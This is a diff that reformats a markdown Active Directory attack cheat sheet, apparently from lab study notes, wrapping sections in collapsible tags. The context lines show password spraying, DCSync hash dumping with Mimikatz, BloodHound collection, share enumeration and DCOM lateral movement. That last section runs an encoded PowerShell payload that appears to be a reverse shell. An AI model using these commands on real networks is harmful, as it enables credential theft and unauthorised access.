@@ -2,7 +2,10 @@
 
 ---
 
-## Table of Contents
+<details open>
+<summary><strong>Table of Contents</strong></summary>
+
+<br>
 
 - [Attacking from Kali](#attacking-from-kali)
   - [Enumeration](#enumeration)
@@ -20,36 +23,45 @@
     - [Pass the Hash](#pass-the-hash)
     - [DCSync](#dcsync)
     - [BloodHound](#bloodhound)
+
 - [Attacking from Victim](#attacking-from-victim)
   - [Enumeration](#enumeration)
     - [Local Enumeration](#local-enumeration)
       - [PowerView](#powerview)
     - [Manual Enumeration](#manual-enumeration)
       - [Enumerate SPNs](#enumerate-spns)
-      - [Enumerate user ACEs](#enumerate-user-aces)
+      - [Enumerate User ACEs](#enumerate-user-aces)
       - [Enumerate Doimain Shares](#enumerate-doimain-shares)
     - [Automated Enumeration](#automated-enumeration)
   - [Attacking](#attacking)
     - [Cached AD Credentials](#cached-ad-credentials)
       - [Mimikatz](#mimikatz)
-      - [Show tickets](#show-tickets)
+      - [Show Tickets](#show-tickets)
     - [AD Authentication](#ad-authentication)
-      - [Passwords attacks](#passwords-attacks)
+      - [Passwords Attacks](#passwords-attacks)
       - [ASREPRoasting](#asreproasting)
       - [Kerberoasting](#kerberoasting)
       - [Silver Tickets](#silver-tickets)
       - [DCSync](#dcsync)
-  - [Lateral movement](#lateral-movement)
+  - [Lateral Movement](#lateral-movement)
     - [WinRM](#winrm)
     - [PsExec](#psexec)
-    - [Pass the hash](#pass-the-hash)
-    - [OverPass the hash](#overpass-the-hash)
-    - [Pass the ticket](#pass-the-ticket)
+    - [Pass the Hash](#pass-the-hash)
+    - [OverPass the Hash](#overpass-the-hash)
+    - [Pass the Ticket](#pass-the-ticket)
     - [DCOM](#dcom)
+
+- [Tips](#tips)
+  - [Generate Passwords from Public Usernames](#generate-passwords-from-public-usernames)
+  - [Always Enumerate Shares Twice](#always-enumerate-shares-twice)
+
+</details>
 
 ---
 
 ## Attacking from Kali
+<details>
+<summary><strong>Enumeration</strong></summary>
 
 ### Enumeration
 
@@ -92,6 +104,11 @@ enumdomusers
 ```bash
 ldapsearch -x -H ldap://<IP> -s base
 ```
+</details>
+
+<details>
+<summary><strong>Attacking without password</strong></summary>
+
 ### Attacking without password
 #### ASREPRoast
 TGT hash
@@ -129,6 +146,12 @@ crackmapexec smb <IP> -u users.txt -p users.txt
 ```bash
 gpp-decrypt <cpassword>
 ```
+
+</details>
+
+<details>
+<summary><strong>Attacking with credentials</strong></summary>
+
 ### Attacking with credentials
 #### Kerberoasting
 TGS hash
@@ -165,8 +188,12 @@ bloodhound-python -d dominio.local -u user -p password -ns <IP> -c all
 ```
 
 ---
+</details>
 
 ## Attacking from Victim
+<details>
+<summary><strong>Enumeration</strong></summary>
+
 ### Enumeration
 #### Local Enumeration
 ```bash
@@ -302,6 +329,11 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desk
 ```
 
 
+</details>
+
+<details>
+<summary><strong>Attacking</strong></summary>
+
 ### Attacking
 #### Cached AD Credentials
 ##### Mimikatz
@@ -354,6 +386,9 @@ iwr -UseDefaultCredentials http://web04
 lsadump::dcsync /user:corp\dave
 #We copy the hash and crack it on kali usong hashcat
 ```
+</details>
+<details>
+<summary><strong>Lateral movement</strong></summary>
 
 ### Lateral movement
 #### WinRM
@@ -397,7 +432,13 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ``` 
 
+</details>
+
+---
 ## Tips
+<details>
+<summary><strong>Tips</strong></summary>
+
 ### Generate Passwords from Public Usernames
 
 ```bash
@@ -422,3 +463,4 @@ crackmapexec smb <IP> --shares -u '' -p ''
 #With credentials
 crackmapexec smb <IP> --shares -u user -p password
 ``` 
+</details>
